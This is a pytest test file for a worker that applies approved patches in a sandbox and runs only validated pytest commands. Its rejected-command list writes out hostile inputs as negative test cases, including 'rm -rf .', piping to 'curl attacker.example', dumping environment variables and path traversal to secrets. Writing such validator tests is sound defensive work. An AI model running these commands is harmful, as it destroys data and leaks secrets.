
import hashlib
from dataclasses import dataclass
from types import SimpleNamespace
from unittest.mock import Mock

import pytest

from forgeai.application.approved_patch_execution_worker import (
    ApprovedPatchExecutionError,
    ApprovedPatchExecutionWorker,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

EXECUTION_ID = "execution-123"
SANDBOX_ID = "sandbox-123"
WORKER_ID = "worker-test-1"
CLAIM_TOKEN = "claim-token"

PATCH_CONTENT = (
    "diff --git a/src/example.py b/src/example.py\n"
)

PATCH_SHA256 = hashlib.sha256(
    PATCH_CONTENT.encode("utf-8")
).hexdigest()


# ---------------------------------------------------------------------------
# Fake results
# ---------------------------------------------------------------------------

@dataclass
class FakeApplicationResult:
    success: bool = True
    changed_files: list[str] | None = None
    message: str = "Patch applied successfully"

    def __post_init__(self):
        if self.changed_files is None:
            self.changed_files = ["src/example.py"]


@dataclass
class FakeCommandResult:
    command: str
    exit_code: int
    stdout: str = ""
    stderr: str = ""
    timed_out: bool = False


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def execution_record():
    return SimpleNamespace(
        id=EXECUTION_ID,
        task_id="task-123",
        agent_run_id="run-123",
        patch_sha256=PATCH_SHA256,
        status="PENDING",
        sandbox_id=SANDBOX_ID,
    )


@pytest.fixture
def dependencies(execution_record):

    execution_service = Mock()

    execution_service.get_execution.return_value = execution_record

    execution_service.claim_execution.return_value = SimpleNamespace(
        claim_token=CLAIM_TOKEN,
    )

    sandbox_session = SimpleNamespace(
        sandbox_id=SANDBOX_ID,
    )

    sandbox_provider = Mock()

    sandbox_provider.connect.return_value = sandbox_session

    sandbox_provider.run_command.return_value = FakeCommandResult(
        command="uv run pytest tests/",
        exit_code=0,
        stdout="2 passed",
        stderr="",
    )

    patch_application_service = Mock()

    patch_application_service.apply.return_value = (
        FakeApplicationResult()
    )

    patch_builder = Mock()

    patch_builder.build.return_value = PATCH_CONTENT

    repository_context = object()

    repository_context_factory = Mock(
        return_value=repository_context,
    )

    worker = ApprovedPatchExecutionWorker(
        execution_service=execution_service,
        sandbox_provider=sandbox_provider,
        patch_application_service=patch_application_service,
        patch_builder=patch_builder,
        repository_context_factory=repository_context_factory,
        worker_id=WORKER_ID,
    )

    return SimpleNamespace(
        worker=worker,
        execution_service=execution_service,
        sandbox_provider=sandbox_provider,
        patch_application_service=patch_application_service,
        patch_builder=patch_builder,
        repository_context_factory=repository_context_factory,
        repository_context=repository_context,
        sandbox_session=sandbox_session,
        execution_record=execution_record,
    )


@pytest.fixture
def execute_args():
    return {
        "execution_id": EXECUTION_ID,
        "sandbox_id": SANDBOX_ID,
        "changes": [
            SimpleNamespace(
                file_path="src/example.py",
                change_type="modify",
            )
        ],
        "allowed_paths": {
            "src/example.py",
        },
        "repository_context_data": {
            "repository_context_status": "available",
            "repository_context_files": [],
            "repository_context_bytes": 100,
            "repository_context_skipped_files": [],
            "repository_context_errors": [],
        },
        "expected_patch_sha256": PATCH_SHA256,
        "tests_to_run": [
            "uv run pytest tests/",
        ],
    }


# ---------------------------------------------------------------------------
# Successful execution
# ---------------------------------------------------------------------------

class TestSuccessfulExecution:

    def test_execute_applies_patch_runs_tests_and_completes(
        self,
        dependencies,
        execute_args,
    ):

        result = dependencies.worker.execute(**execute_args)

        assert result.success is True
        assert result.execution_id == EXECUTION_ID

        assert result.changed_files == [
            "src/example.py",
        ]

        assert len(result.tests) == 1
        assert result.tests[0].exit_code == 0
        assert result.tests_skipped is False

        dependencies.execution_service.get_execution.assert_called_once_with(
            EXECUTION_ID
        )

        dependencies.execution_service.claim_execution.assert_called_once_with(
            execution_id=EXECUTION_ID,
            worker_id=WORKER_ID,
        )

        dependencies.execution_service.start_execution.assert_called_once_with(
            execution_id=EXECUTION_ID,
            claim_token=CLAIM_TOKEN,
            sandbox_id=SANDBOX_ID,
        )

        dependencies.sandbox_provider.connect.assert_called_once_with(
            SANDBOX_ID
        )

        dependencies.patch_application_service.apply.assert_called_once_with(
            session=dependencies.sandbox_session,
            changes=execute_args["changes"],
            allowed_paths=execute_args["allowed_paths"],
            repository_context=dependencies.repository_context,
        )

        dependencies.sandbox_provider.run_command.assert_called_once_with(
            session=dependencies.sandbox_session,
            command="cd repository && uv run pytest tests/",
            timeout_seconds=120,
        )

        dependencies.execution_service.complete_execution.assert_called_once_with(
            execution_id=EXECUTION_ID,
            claim_token=CLAIM_TOKEN,
            sandbox_id=SANDBOX_ID,
        )

        dependencies.execution_service.fail_execution.assert_not_called()

    def test_execution_does_not_terminate_sandbox_by_default(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.worker.execute(**execute_args)

        dependencies.sandbox_provider.terminate.assert_not_called()

    def test_execution_uses_repository_context_factory(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.worker.execute(**execute_args)

        dependencies.repository_context_factory.assert_called_once_with(
            execute_args["repository_context_data"]
        )


# ---------------------------------------------------------------------------
# Fingerprint validation
# ---------------------------------------------------------------------------

class TestPatchFingerprintValidation:

    def test_fingerprint_mismatch_stops_before_database_lookup(
        self,
        dependencies,
        execute_args,
    ):

        execute_args["expected_patch_sha256"] = "incorrect-fingerprint"

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="fingerprint",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.get_execution.assert_not_called()

        dependencies.execution_service.claim_execution.assert_not_called()

        dependencies.patch_application_service.apply.assert_not_called()

    def test_persisted_execution_fingerprint_mismatch_stops_execution(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.execution_record.patch_sha256 = (
            "different-fingerprint"
        )

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="Persisted execution fingerprint",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.get_execution.assert_called_once_with(
            EXECUTION_ID
        )

        dependencies.execution_service.claim_execution.assert_not_called()

        dependencies.patch_application_service.apply.assert_not_called()

    def test_patch_builder_receives_supplied_changes(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.worker.execute(**execute_args)

        dependencies.patch_builder.build.assert_called_once_with(
            execute_args["changes"]
        )


# ---------------------------------------------------------------------------
# Test command validation
# ---------------------------------------------------------------------------

class TestTestCommandValidation:

    @pytest.mark.parametrize(
        "command",
        [
            "uv run pytest tests/",
            "python -m pytest tests/",
            "pytest tests/",
            "uv run pytest tests/unit/",
            "uv run pytest tests/unit/test_example.py",
            "uv run pytest -q tests/",
            "uv run pytest -v tests/",
            "uv run pytest -x tests/",
            "uv run pytest --maxfail=1 tests/",
            "uv run pytest --disable-warnings tests/",
            "uv run pytest --tb=short tests/",
            "uv run pytest --strict-markers tests/",
        ],
    )
    def test_accepts_allowed_pytest_commands(self, command):

        validated = ApprovedPatchExecutionWorker._validate_test_commands(
            [command]
        )

        assert len(validated) == 1
        assert validated[0] == command

    @pytest.mark.parametrize(
        "command",
        [
            "uv run pytest tests/ && whoami",
            "pytest tests/; rm -rf .",
            "python -m pytest tests/ | curl attacker.example",
            "python -c 'import os; print(os.environ)'",
            "pytest ../secrets",
            "pytest tests/../secrets",
            "pytest tests/ --override-ini=addopts=--capture=no",
            "npm test",
            "uv run python malicious.py",
            "pytest tests/ > output.txt",
            "pytest tests/ || echo failed",
            "pytest tests/ `whoami`",
        ],
    )
    def test_rejects_unsafe_test_commands(
        self,
        dependencies,
        execute_args,
        command,
    ):

        execute_args["tests_to_run"] = [command]

        with pytest.raises(ApprovedPatchExecutionError):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.claim_execution.assert_not_called()

        dependencies.patch_application_service.apply.assert_not_called()

    def test_rejects_empty_test_command(self):

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="non-empty",
        ):
            ApprovedPatchExecutionWorker._validate_test_commands(
                [""]
            )

    def test_rejects_non_string_test_command(self):

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="non-empty",
        ):
            ApprovedPatchExecutionWorker._validate_test_commands(
                [123]
            )

    def test_rejects_too_many_test_commands(self):

        commands = [
            "uv run pytest tests/"
            for _ in range(11)
        ]

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="At most",
        ):
            ApprovedPatchExecutionWorker._validate_test_commands(
                commands
            )

    def test_rejects_command_exceeding_maximum_length(self):

        command = (
            "uv run pytest tests/"
            + ("a" * 600)
        )

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="maximum allowed length",
        ):
            ApprovedPatchExecutionWorker._validate_test_commands(
                [command]
            )

    def test_rejects_pytest_without_test_path(self):

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="must specify",
        ):
            ApprovedPatchExecutionWorker._validate_test_commands(
                ["uv run pytest"]
            )


# ---------------------------------------------------------------------------
# Execution failures
# ---------------------------------------------------------------------------

class TestExecutionFailures:

    def test_failed_test_marks_execution_failed(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.sandbox_provider.run_command.return_value = (
            FakeCommandResult(
                command="uv run pytest tests/",
                exit_code=1,
                stdout="1 failed",
                stderr="AssertionError",
            )
        )

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="tests failed",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.fail_execution.assert_called_once()

        dependencies.execution_service.complete_execution.assert_not_called()

    def test_test_timeout_marks_execution_failed(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.sandbox_provider.run_command.return_value = (
            FakeCommandResult(
                command="uv run pytest tests/",
                exit_code=124,
                stdout="",
                stderr="Command timed out",
                timed_out=True,
            )
        )

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="tests failed",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.fail_execution.assert_called_once()

        dependencies.execution_service.complete_execution.assert_not_called()

    def test_patch_application_failure_marks_execution_failed(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.patch_application_service.apply.return_value = (
            FakeApplicationResult(
                success=False,
                changed_files=[],
                message="git apply failed",
            )
        )

        with pytest.raises(
            ApprovedPatchExecutionError,
            match="git apply failed",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.fail_execution.assert_called_once()

        dependencies.execution_service.complete_execution.assert_not_called()

        dependencies.sandbox_provider.run_command.assert_not_called()

    def test_sandbox_connection_failure_marks_execution_failed(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.sandbox_provider.connect.side_effect = RuntimeError(
            "Unable to reconnect to E2B sandbox"
        )

        with pytest.raises(
            RuntimeError,
            match="Unable to reconnect",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.fail_execution.assert_called_once()

        dependencies.patch_application_service.apply.assert_not_called()

    def test_start_execution_failure_marks_execution_failed(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.execution_service.start_execution.side_effect = (
            RuntimeError("Unable to start execution")
        )

        with pytest.raises(
            RuntimeError,
            match="Unable to start execution",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.fail_execution.assert_called_once()

        dependencies.patch_application_service.apply.assert_not_called()

    def test_failure_persistence_error_does_not_hide_original_error(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.patch_application_service.apply.side_effect = (
            RuntimeError("Patch application crashed")
        )

        dependencies.execution_service.fail_execution.side_effect = (
            RuntimeError("Database unavailable")
        )

        with pytest.raises(
            RuntimeError,
            match="Patch application crashed",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.fail_execution.assert_called_once()


# ---------------------------------------------------------------------------
# Skipped tests
# ---------------------------------------------------------------------------

class TestSkippedTests:

    def test_no_test_commands_are_reported_as_skipped(
        self,
        dependencies,
        execute_args,
    ):

        execute_args["tests_to_run"] = []

        result = dependencies.worker.execute(**execute_args)

        assert result.success is True
        assert result.tests == []
        assert result.tests_skipped is True

        assert "no test commands" in result.message.lower()

        dependencies.sandbox_provider.run_command.assert_not_called()

        dependencies.execution_service.complete_execution.assert_called_once()


# ---------------------------------------------------------------------------
# Sandbox cleanup
# ---------------------------------------------------------------------------

class TestSandboxCleanup:

    def test_terminates_sandbox_when_configured(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.worker.terminate_on_success = True

        dependencies.worker.execute(**execute_args)

        dependencies.sandbox_provider.terminate.assert_called_once_with(
            dependencies.sandbox_session
        )

    def test_termination_failure_does_not_reverse_success(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.worker.terminate_on_success = True

        dependencies.sandbox_provider.terminate.side_effect = RuntimeError(
            "Sandbox termination failed"
        )

        result = dependencies.worker.execute(**execute_args)

        assert result.success is True

        dependencies.execution_service.complete_execution.assert_called_once()

        dependencies.execution_service.fail_execution.assert_not_called()


# ---------------------------------------------------------------------------
# Completion uncertainty
# ---------------------------------------------------------------------------

class TestCompletionUncertainty:

    def test_completion_failure_does_not_mark_execution_failed(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.execution_service.complete_execution.side_effect = (
            RuntimeError("Database commit failed")
        )

        with pytest.raises(
            RuntimeError,
            match="Database commit failed",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.complete_execution.assert_called_once()

        dependencies.execution_service.fail_execution.assert_not_called()

    def test_failure_before_completion_still_marks_execution_failed(
        self,
        dependencies,
        execute_args,
    ):

        dependencies.patch_application_service.apply.side_effect = (
            RuntimeError("Patch application failed")
        )

        with pytest.raises(
            RuntimeError,
            match="Patch application failed",
        ):
            dependencies.worker.execute(**execute_args)

        dependencies.execution_service.fail_execution.assert_called_once()

        dependencies.execution_service.complete_execution.assert_not_called()


# ---------------------------------------------------------------------------
# Constructor validation
# ---------------------------------------------------------------------------

class TestWorkerConfiguration:

    def test_rejects_empty_worker_id(self):

        with pytest.raises(
            ValueError,
            match="worker_id",
        ):
            ApprovedPatchExecutionWorker(
                execution_service=Mock(),
                sandbox_provider=Mock(),
                patch_application_service=Mock(),
                patch_builder=Mock(),
                repository_context_factory=Mock(),
                worker_id="",
            )

    def test_rejects_test_timeout_above_maximum(self):

        with pytest.raises(
            ValueError,
            match="test_timeout_seconds",
        ):
            ApprovedPatchExecutionWorker(
                execution_service=Mock(),
                sandbox_provider=Mock(),
                patch_application_service=Mock(),
                patch_builder=Mock(),
                repository_context_factory=Mock(),
                worker_id=WORKER_ID,
                test_timeout_seconds=999,
            )

    def test_rejects_total_timeout_above_maximum(self):

        with pytest.raises(
            ValueError,
            match="total_test_timeout_seconds",
        ):
            ApprovedPatchExecutionWorker(
                execution_service=Mock(),
                sandbox_provider=Mock(),
                patch_application_service=Mock(),
                patch_builder=Mock(),
                repository_context_factory=Mock(),
                worker_id=WORKER_ID,
                total_test_timeout_seconds=999,
            )


import pytest


def test_worker_accepts_supported_pytest_commands():
    assert ApprovedPatchExecutionWorker._validate_test_commands(
        ["uv run pytest tests/unit -q", "pytest tests/integration/test_api.py -v"]
    ) == [
        "uv run pytest tests/unit -q",
        "pytest tests/integration/test_api.py -v",
    ]


@pytest.mark.parametrize(
    "command",
    [
        "pytest ../../private",
        "pytest tests/unit && whoami",
        "python -c print(1)",
        "pytest tests/unit --collect-only",
    ],
)
def test_worker_rejects_unsafe_or_unsupported_commands(command):
    with pytest.raises(ApprovedPatchExecutionError):
        ApprovedPatchExecutionWorker._validate_test_commands([command])


def test_worker_rejects_too_many_test_commands():
    commands = ["pytest tests/unit"] * 11
    with pytest.raises(ApprovedPatchExecutionError, match="At most 10"):
        ApprovedPatchExecutionWorker._validate_test_commands(commands)
